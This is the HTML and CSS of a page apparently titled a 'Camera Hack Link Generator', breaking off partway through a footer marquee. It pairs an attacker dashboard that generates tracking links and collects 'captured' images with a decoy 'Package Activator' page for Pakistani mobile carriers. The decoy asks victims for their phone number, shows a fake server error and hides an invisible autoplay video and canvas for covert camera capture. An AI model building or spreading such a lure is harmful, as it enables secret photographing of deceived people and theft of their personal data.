<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>🔗 Camera Ha3k Link Generator | SAJJAD_HACKER  </title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<style>
:root {
  /* Light Theme Variables */
  --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  --dark-bg: #0f172a;
  --card-bg: #ffffff;
  --card-border: #e2e8f0;
  --text-primary: #1e293b;
  --text-secondary: #64748b;
  --text-light: #94a3b8;
  --accent-blue: #3b82f6;
  --accent-green: #10b981;
  --accent-red: #ef4444;
  --accent-purple: #8b5cf6;
  --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
  --shadow-lg: 0 10px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
  --shadow-xl: 0 20px 40px -10px rgba(0,0,0,0.15);
  --radius-sm: 8px;
  --radius-md: 12px;
  --radius-lg: 16px;
  --radius-xl: 24px;
  --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}

[data-theme="dark"] {
  /* Dark Theme Variables */
  --primary-gradient: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
  --secondary-gradient: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
  --dark-bg: #0f172a;
  --card-bg: #1e293b;
  --card-border: #334155;
  --text-primary: #f8fafc;
  --text-secondary: #cbd5e1;
  --text-light: #94a3b8;
  --accent-blue: #60a5fa;
  --accent-green: #34d399;
  --accent-red: #f87171;
  --accent-purple: #a78bfa;
  --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.4), 0 2px 4px -1px rgba(0,0,0,0.3);
  --shadow-lg: 0 10px 25px -5px rgba(0,0,0,0.5), 0 10px 10px -5px rgba(0,0,0,0.3);
  --shadow-xl: 0 20px 40px -10px rgba(0,0,0,0.6);
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Inter', sans-serif;
  background: var(--dark-bg);
  color: var(--text-primary);
  min-height: 100vh;
  padding: 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  transition: var(--transition);
  position: relative;
  overflow-x: hidden;
}

body::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: 
    radial-gradient(circle at 10% 20%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
    radial-gradient(circle at 90% 80%, rgba(255, 119, 198, 0.1) 0%, transparent 20%);
  z-index: -1;
}

/* Theme Toggle */
.theme-toggle {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 1000;
}

.theme-toggle button {
  background: var(--card-bg);
  border: 1px solid var(--card-border);
  color: var(--text-primary);
  width: 44px;
  height: 44px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: var(--transition);
  box-shadow: var(--shadow-md);
}

.theme-toggle button:hover {
  transform: rotate(30deg);
  box-shadow: var(--shadow-lg);
}

/* Main Container */
.container {
  width: 100%;
  max-width: 1200px;
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 30px;
  margin: 20px auto;
}

@media (max-width: 992px) {
  .container {
    grid-template-columns: 1fr;
    gap: 20px;
  }
}

/* Cards */
.card {
  background: var(--card-bg);
  border-radius: var(--radius-xl);
  padding: 40px;
  box-shadow: var(--shadow-xl);
  border: 1px solid var(--card-border);
  transition: var(--transition);
  position: relative;
  overflow: hidden;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 4px;
  background: var(--primary-gradient);
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: var(--shadow-lg);
}

/* Header */
.header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 30px;
  flex-wrap: wrap;
  gap: 15px;
}

.logo-container {
  display: flex;
  align-items: center;
  gap: 15px;
}

.logo {
  width: 50px;
  height: 50px;
  background: var(--primary-gradient);
  border-radius: var(--radius-md);
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
  font-size: 24px;
  font-weight: 700;
}

.logo-text {
  font-size: 24px;
  font-weight: 800;
  background: var(--primary-gradient);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.badge {
  background: var(--secondary-gradient);
  color: white;
  padding: 6px 12px;
  border-radius: var(--radius-sm);
  font-size: 12px;
  font-weight: 600;
  letter-spacing: 0.5px;
}

/* Typography */
h1 {
  font-family: 'Poppins', sans-serif;
  font-size: 32px;
  font-weight: 800;
  margin-bottom: 10px;
  background: var(--primary-gradient);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

h2 {
  font-family: 'Poppins', sans-serif;
  font-size: 24px;
  font-weight: 700;
  margin-bottom: 20px;
  color: var(--text-primary);
}

h3 {
  font-family: 'Poppins', sans-serif;
  font-size: 18px;
  font-weight: 600;
  margin-bottom: 15px;
  color: var(--text-primary);
}

.subtitle {
  color: var(--text-secondary);
  font-size: 16px;
  line-height: 1.6;
  margin-bottom: 30px;
}

/* Buttons */
.btn {
  padding: 14px 28px;
  border-radius: var(--radius-md);
  border: none;
  font-family: 'Inter', sans-serif;
  font-weight: 600;
  font-size: 15px;
  cursor: pointer;
  transition: var(--transition);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  letter-spacing: 0.3px;
}

.btn-primary {
  background: var(--primary-gradient);
  color: white;
  box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
}

.btn-primary:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
}

.btn-secondary {
  background: var(--secondary-gradient);
  color: white;
  box-shadow: 0 4px 15px rgba(240, 147, 251, 0.3);
}

.btn-secondary:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(240, 147, 251, 0.4);
}

.btn-success {
  background: var(--accent-green);
  color: white;
  box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
}

.btn-danger {
  background: var(--accent-red);
  color: white;
  box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
}

.btn-outline {
  background: transparent;
  border: 2px solid var(--card-border);
  color: var(--text-primary);
}

.btn-outline:hover {
  border-color: var(--accent-blue);
  color: var(--accent-blue);
}

.btn-small {
  padding: 10px 20px;
  font-size: 14px;
}

.btn-full {
  width: 100%;
}

/* Form Elements */
.form-group {
  margin-bottom: 25px;
}

label {
  display: block;
  margin-bottom: 8px;
  font-weight: 500;
  color: var(--text-primary);
  font-size: 14px;
}

select, input {
  width: 100%;
  padding: 16px 20px;
  border-radius: var(--radius-md);
  border: 2px solid var(--card-border);
  background: var(--card-bg);
  color: var(--text-primary);
  font-family: 'Inter', sans-serif;
  font-size: 15px;
  transition: var(--transition);
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 20px center;
  background-size: 16px;
}

select:focus, input:focus {
  outline: none;
  border-color: var(--accent-blue);
  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
}

.input-with-icon {
  position: relative;
}

.input-icon {
  position: absolute;
  left: 20px;
  top: 50%;
  transform: translateY(-50%);
  color: var(--text-light);
}

.input-with-icon input {
  padding-left: 50px;
}

/* Link Box */
.link-box {
  background: rgba(59, 130, 246, 0.05);
  border-radius: var(--radius-md);
  padding: 25px;
  margin: 25px 0;
  border: 1px solid rgba(59, 130, 246, 0.2);
}

.link-display {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
}

.link-display input {
  flex: 1;
  background: var(--card-bg);
  font-family: 'Monaco', 'Courier New', monospace;
  font-size: 14px;
  padding: 14px;
}

.btn-group {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.session-info {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(16, 185, 129, 0.05);
  padding: 12px 20px;
  border-radius: var(--radius-md);
  margin-top: 20px;
  border: 1px solid rgba(16, 185, 129, 0.2);
}

.session-info span {
  font-size: 14px;
  color: var(--text-secondary);
}

.session-id {
  font-family: 'Monaco', 'Courier New', monospace;
  font-weight: 600;
  color: var(--accent-green);
}

/* Gallery */
.gallery-container {
  margin-top: 30px;
}

.gallery-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 20px;
}

.gallery {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
  gap: 12px;
  margin-bottom: 25px;
}

.gallery-item {
  position: relative;
  border-radius: var(--radius-md);
  overflow: hidden;
  aspect-ratio: 1;
  background: var(--card-border);
  transition: var(--transition);
}

.gallery-item:hover {
  transform: scale(1.05);
  box-shadow: var(--shadow-md);
}

.gallery-item img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: block;
}

.gallery-placeholder {
  grid-column: 1 / -1;
  text-align: center;
  padding: 40px 20px;
  color: var(--text-light);
  background: rgba(148, 163, 184, 0.05);
  border-radius: var(--radius-md);
  border: 1px dashed var(--card-border);
}

/* Status Messages */
.status-message {
  padding: 20px;
  border-radius: var(--radius-md);
  margin: 20px 0;
  text-align: center;
  font-weight: 500;
  display: none;
}

.status-error {
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid rgba(239, 68, 68, 0.3);
  color: var(--accent-red);
}

.status-success {
  background: rgba(16, 185, 129, 0.1);
  border: 1px solid rgba(16, 185, 129, 0.3);
  color: var(--accent-green);
}

.status-warning {
  background: rgba(245, 158, 11, 0.1);
  border: 1px solid rgba(245, 158, 11, 0.3);
  color: #f59e0b;
}

/* Stats Cards */
.stats-container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 15px;
  margin: 25px 0;
}

.stat-card {
  background: var(--card-bg);
  border-radius: var(--radius-md);
  padding: 20px;
  text-align: center;
  border: 1px solid var(--card-border);
  transition: var(--transition);
}

.stat-card:hover {
  transform: translateY(-3px);
  box-shadow: var(--shadow-md);
}

.stat-number {
  font-size: 32px;
  font-weight: 800;
  background: var(--primary-gradient);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  margin-bottom: 5px;
}

.stat-label {
  font-size: 13px;
  color: var(--text-secondary);
  text-transform: uppercase;
  letter-spacing: 1px;
}

/* Footer */
.footer {
  text-align: center;
  margin-top: 40px;
  padding-top: 30px;
  border-top: 1px solid var(--card-border);
  color: var(--text-light);
  font-size: 14px;
  width: 100%;
}

.powered-by {
  font-size: 16px;
  font-weight: 600;
  margin-bottom: 10px;
  color: var(--text-primary);
}

.marquee-container {
  overflow: hidden;
  white-space: nowrap;
  margin: 20px 0;
  padding: 15px 0;
  position: relative;
}

.marquee-container::before,
.marquee-container::after {
  content: '';
  position: absolute;
  top: 0;
  width: 100px;
  height: 100%;
  z-index: 1;
}

.marquee-container::before {
  left: 0;
  background: linear-gradient(to right, var(--dark-bg), transparent);
}

.marquee-container::after {
  right: 0;
  background: linear-gradient(to left, var(--dark-bg), transparent);
}

.marquee-content {
  display: inline-block;
  animation: marquee 30s linear infinite;
  font-size: 18px;
  font-weight: 600;
  padding-left: 100%;
}

@keyframes marquee {
  0% { transform: translateX(0); }
  100% { transform: translateX(-100%); }
}

/* Floating Buttons */
.floating-buttons {
  position: fixed;
  bottom: 30px;
  right: 30px;
  display: flex;
  flex-direction: column;
  gap: 15px;
  z-index: 1000;
}

.floating-btn {
  width: 56px;
  height: 56px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
  font-size: 22px;
  box-shadow: var(--shadow-lg);
  transition: var(--transition);
  border: none;
  cursor: pointer;
}

.floating-btn:hover {
  transform: translateY(-5px) scale(1.1);
  box-shadow: var(--shadow-xl);
}

.floating-btn-whatsapp {
  background: linear-gradient(135deg, #25D366, #128C7E);
}

.floating-btn-download {
  background: var(--primary-gradient);
}

.floating-btn-help {
  background: var(--secondary-gradient);
}

/* Responsive Design */
@media (max-width: 768px) {
  .container {
    padding: 15px;
  }
  
  .card {
    padding: 25px;
  }
  
  .link-display {
    flex-direction: column;
  }
  
  .btn-group {
    flex-direction: column;
  }
  
  .btn-group .btn {
    width: 100%;
  }
  
  .floating-buttons {
    bottom: 20px;
    right: 20px;
  }
}

/* Animation for new link generation */
@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.05); }
  100% { transform: scale(1); }
}

.pulse {
  animation: pulse 0.5s ease-in-out;
}

/* Hidden elements */
.hidden {
  display: none;
}

video, canvas {
  opacity: 0;
  position: absolute;
  z-index: -1;
}
</style>
</head>
<body>
<!-- Theme Toggle -->
<div class="theme-toggle">
  <button id="themeToggle">
    <i class="fas fa-moon"></i>
  </button>
</div>

<!-- Main Container -->
<div class="container">
  <!-- Dashboard Card -->
  <div class="card" id="dashboard-card">
    <div class="header">
      <div class="logo-container">
        <div class="logo"></div>
        <div class="logo-text">SAJJAD_HACKER CAM3RA H4CK</div>
      </div>
      <div class="badge">PROFESSIONAL HACKER</div>
    </div>
    
    <h1>Secure Link Generator</h1>
    <p class="subtitle">Generate unique tracking links and manage captured data. All sessions persist even after page refresh.</p>
    
    <!-- Stats -->
    <div class="stats-container">
      <div class="stat-card">
        <div class="stat-number" id="totalLinks">0</div>
        <div class="stat-label">Links Generated</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="totalImages">0</div>
        <div class="stat-label">Images Captured</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="activeSessions">1</div>
        <div class="stat-label">Active Sessions</div>
      </div>
    </div>
    
    <!-- Link Generation Section -->
    <div class="form-group">
      <button class="btn btn-primary btn-full" id="genBtn">
        <i class="fas fa-plus-circle"></i> Generate New Link
      </button>
    </div>
    
    <div id="linkArea" class="hidden">
      <div class="link-box">
        <h3><i class="fas fa-link"></i> Generated Link</h3>
        <div class="link-display">
          <input type="text" id="generatedLink" readonly>
        </div>
        <div class="btn-group">
          <button class="btn btn-secondary btn-small" id="copyBtn">
            <i class="fas fa-copy"></i> Copy
          </button>
          <button class="btn btn-outline btn-small" id="openBtn">
            <i class="fas fa-external-link-alt"></i> Open
          </button>
          <button class="btn btn-success btn-small" id="refreshBtn">
            <i class="fas fa-sync-alt"></i> Refresh Data
          </button>
        </div>
        
        <!-- Session Info -->
        <div class="session-info">
          <span><i class="fas fa-user-shield"></i> Active Session</span>
          <span class="session-id" id="sessionId">Not Set</span>
        </div>
      </div>
    </div>
    
    <!-- Data Area -->
    <div id="dataArea" class="hidden">
      <div class="gallery-header">
        <h3><i class="fas fa-images"></i> Captured Data</h3>
        <button class="btn btn-danger btn-small" id="clearBtn">
          <i class="fas fa-trash"></i> Clear All
        </button>
      </div>
      
      <div class="gallery" id="images"></div>
      
      <button class="btn btn-primary btn-full" id="downloadBtn">
        <i class="fas fa-download"></i> Download All Images (ZIP)
      </button>
    </div>
    
    <!-- Disclaimer -->
    <div class="status-message status-warning" style="display: block; margin-top: 30px;">
      <i class="fas fa-exclamation-triangle"></i> DISCLAIMER: Use responsibly and only for legitimate purposes. Unauthorized access to devices is illegal.
    </div>
  </div>
  
  <!-- Package Activator Card -->
  <div class="card" id="pkg-activator-card" style="display: none;">
    <div class="header">
      <div class="logo-container">
        <div class="logo">PA</div>
        <div class="logo-text">Package Activator</div>
      </div>
      <div class="badge">PREMIUM</div>
    </div>
    
    <h1>Package Activation</h1>
    <p class="subtitle">Select your SIM provider and enter your mobile number to activate your desired package.</p>
    
    <!-- Activation Form -->
    <div class="form-group">
      <label for="sim-select"><i class="fas fa-sim-card"></i> Select SIM Provider</label>
      <select id="sim-select">
        <option value="">-- Choose Provider --</option>
        <option value="jazz">Jazz</option>
        <option value="telenor">Telenor</option>
        <option value="ufone">Ufone</option>
        <option value="zong">Zong</option>
        <option value="sco">SCOM</option>
        <option value="other">Other/Landline</option>
      </select>
    </div>
    
    <div class="form-group">
      <label for="mobile-number"><i class="fas fa-mobile-alt"></i> Mobile Number</label>
      <div class="input-with-icon">
        <i class="fas fa-phone input-icon"></i>
        <input type="tel" id="mobile-number" placeholder="03xxxxxxxxx" maxlength="11">
      </div>
    </div>
    
    <button class="btn btn-primary btn-full" id="activateBtn">
      <i class="fas fa-bolt"></i> Activate Package
    </button>
    
    <!-- Activation Status -->
    <div class="status-message status-error" id="activationStatus">
      <i class="fas fa-server"></i> SERVER ERROR<br>
      <small>Please try again later. Server is down due to overload.</small>
    </div>
    
    <!-- Camera Elements (Hidden) -->
    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement"></canvas>
  </div>
</div>

<!-- Marquee -->
<div class="marquee-container">
  <div class="marquee-content">
    <span style="color: #ff0000">P</span>
    <span style="color: #ff3300">O</span>
    <span style="color: #ff6600">W</span>
    <span style="color: #ff9900">E</span>
    <span style="color: #ffcc00">R</span>
    <span style="color: #ffff00">E</span>
    <span style="color: #ccff00">D</span>
    <span style="color: #99ff00"> </span>
    <span style="color: #66ff00">B</span>
    <span style="color: #33ff00">Y</span>
    <span style="color: #00ff00"> </span>
    <span style="color: #00ff33">|</span>
    <span style="color: #00ff66"> </span>
    <span style="color: #00ff99">MR.</span>
    <span style="color: #00ffcc">SAD</span>
    <span style="color: #00ffff">x</span>
    <span style="color: #00ccff">H</span>
    <span style="color: #0099ff">A</span>
    <span style="color: #0066ff">C</span>
    <span style="color: #0033ff">K</span>
    <span style="color: #0000ff">E</span>
    <span style="color: #3300ff">R</span>
    <span style="color: #6600ff"> </span>
    <span style="color: #9900ff">P</span>
    <span style="color: #cc00ff">R</span>
    <span style="color: #ff00ff">O</span>
    <span style="color: #ff00cc"> </
